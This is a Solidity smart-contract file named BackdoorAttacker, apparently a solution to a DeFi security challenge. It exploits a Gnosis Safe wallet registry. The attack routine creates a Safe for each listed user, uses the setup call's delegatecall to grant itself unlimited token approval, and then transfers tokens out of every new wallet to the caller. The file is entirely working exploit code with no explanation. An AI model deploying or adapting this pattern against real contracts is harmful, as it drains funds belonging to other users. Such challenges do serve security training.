// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";

interface IGnosisSafe {
    function setup(
        address[] calldata _owners,
        uint256 _threshold,
        address to,
        bytes calldata data,
        address fallbackHandler,
        address paymentToken,
        uint256 payment,
        address payable paymentReceiver
    ) external;
}

interface IGnosisSafeProxyFactory {
    function createProxyWithCallback(
        address _singleton,
        bytes memory initializer,
        uint256 saltNonce,
        IProxyCreationCallback callback
    ) external returns (GnosisSafeProxy proxy);
}

contract BackdoorAttacker {
    address public masterCopyAddress;
    address public walletRegistryAddress;
    IGnosisSafeProxyFactory proxyFactory;
    address public token;

    constructor(
        address _proxyFactoryAddress,
        address _walletRegistryAddress,
        address _masterCopyAddress,
        address _token
    ) {
        proxyFactory = IGnosisSafeProxyFactory(_proxyFactoryAddress);
        walletRegistryAddress = _walletRegistryAddress;
        masterCopyAddress = _masterCopyAddress;
        token = _token;
    }

    function approve(address spender, address _token) external {
        IERC20(_token).approve(spender, type(uint256).max);
    }

    function attack(address[] calldata users) public {
        for (uint256 i = 0; i < users.length; i++) {
            address user = users[i];
            address[] memory owners = new address[](1);
            owners[0] = user;

            bytes memory encodedApprove = abi.encodeWithSignature("approve(address,address)", address(this), token);
            bytes memory initializer = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                owners,
                1,
                address(this),
                encodedApprove,
                address(0),
                0,
                0,
                0
            );
            GnosisSafeProxy proxy = proxyFactory.createProxyWithCallback(
                masterCopyAddress, initializer, 1, IProxyCreationCallback(walletRegistryAddress)
            );
            // transfer the approved tokens
            IERC20(token).transferFrom(address(proxy), msg.sender, 10 ether);
        }
    }
}
